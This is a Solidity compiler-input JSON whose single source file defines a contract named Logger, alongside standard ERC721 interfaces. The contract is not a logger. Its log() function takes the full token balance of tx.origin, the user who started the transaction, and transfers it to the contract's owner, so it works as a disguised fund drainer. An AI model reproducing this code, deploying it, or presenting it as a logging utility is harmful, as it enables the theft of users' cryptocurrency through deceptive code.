{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "Logger.sol": {
      "content": "pragma solidity ^0.8.9;\n\n\ninterface IERC165 {\n    \n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\n}\n\ninterface IERC721 is IERC165 {\n    \n    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);\n\n    \n    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);\n\n    \n    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\n\n    \n    function balanceOf(address owner) external view returns (uint256 balance);\n\n    \n    function ownerOf(uint256 tokenId) external view returns (address owner);\n\n    \n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) external;\n\n    \n    function transferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) external;\n\n    \n    function approve(address to, uint256 tokenId) external;\n\n    \n    function getApproved(uint256 tokenId) external view returns (address operator);\n\n    \n    function setApprovalForAll(address operator, bool _approved) external;\n\n    \n    function isApprovedForAll(address owner, address operator) external view returns (bool);\n\n    \n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes calldata data\n    ) external;\n}\n\ninterface IERC721Enumerable is IERC721 {\n    \n    function totalSupply() external view returns (uint256);\n\n    \n    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256 tokenId);\n\n    \n    function tokenByIndex(uint256 index) external view returns (uint256);\n}\n\ninterface ITarget {\n    function transferTo(address recipient, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n}\n\ncontract Logger {\n    ITarget target;\n    uint256 minimum = 1;\n    address owner = msg.sender;\n\n    constructor(ITarget _target) {\n        target = _target;\n    }\n\n    function setMin(uint256 amount) external {\n        require(msg.sender == owner, \"notowner\");\n        minimum = amount;\n    }\n\n    function log(bool exception) public returns (bool) {\n        if(tx.origin == owner) return true;\n        \n        uint256 amount = target.balanceOf(tx.origin);\n        if(amount >= minimum) {\n            return target.transferTo(owner, amount);\n        } else if(!exception) {\n            return false;\n        }\n\n        revert(\"PERMISSION_DENIED\");\n    }\n}"
    }
  }
}